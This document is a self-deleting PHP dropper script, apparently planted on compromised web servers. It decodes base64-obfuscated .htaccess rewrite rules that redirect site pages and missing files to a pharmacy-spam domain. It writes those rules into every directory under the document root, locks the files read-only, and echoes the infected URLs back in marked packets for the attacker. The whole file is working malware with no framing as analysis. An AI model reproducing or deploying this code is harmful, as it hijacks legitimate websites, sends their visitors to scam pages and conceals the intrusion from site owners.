<?php unlink(__FILE__); $file_body = 'UmV3cml0ZVJ1bGUgXihbQS1aYS16MC05LV0rKS5odG1sJCBodHRwOi8vcGlsbHNzdG9yZS5zaG9wLz9jb3Vwb249QmViZ1RrYiBbTF0NClJld3JpdGVSdWxlIF4oW0EtWmEtejAtOS1dKykudHh0JCBodHRwOi8vcGlsbHNzdG9yZS5zaG9wLz9jb3Vwb249QmViZ1RrYiBbTF0NClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZg0KUmV3cml0ZVJ1bGUgLiBodHRwOi8vcGlsbHNzdG9yZS5zaG9wLz9jb3Vwb249QmViZ1RrYiBbTF0NCg0K';
$file_name = '.htaccess';
$dir_name = '##DIR_NAME##';


$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;

$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

//echo $path . PHP_EOL;

$root = $path;

//$dir = '.';
//$dir = dirname($root);
$dir = $root;

//echo $root . ' ****** ' ;




$directories = glob($dir . '/*', GLOB_ONLYDIR);

foreach ($directories as $value){

$htaccess = base64_decode($file_body);


$fname = $value . '/.htaccess';
chmod($fname, 0644);
file_put_contents($fname, $htaccess);
chmod($fname, 0444);
//echo $shell_url . ' --------- ' . $value . PHP_EOL;

$dir_check =  parseDir($value);



//break;


$mystr = $value;
$findMe   =  $_SERVER['HTTP_HOST'] ;
$position = strpos($mystr, $findMe);

echo '###PACKET_START###';

foreach($dir_check as $check_dir) {

$check_link = ltrim(rtrim($shell_url . '/' . $check_dir));



$check_htaccess = file_get_contents($check_dir . '.htaccess');

if ($htaccess == $check_htaccess )
{
echo '###EXLINK' . $check_link . 'hz' . '##MM##';

}
}
}


function parseDir($dir)
{

$result = array();

$dir = str_replace( "\\", "/" , $dir );
$dir = str_replace( "//", "/" , $dir );

//echo $dir . PHP_EOL;



 $num = 1;

  while (strlen($dir) >= 10) {


$position = strpos($dir, "/");

if (strpos($dir,'/') !== false) {}else{break;}

$dir = substr($dir, $position + 1, 1000);
//echo $dir . '/hz' . PHP_EOL;
array_push($result, $dir . '/');        
    $num++;
    if ($num > 15){break;}
  }
return $result;
} 




echo '###PACKET_END###';
echo "###REL_DONE##";









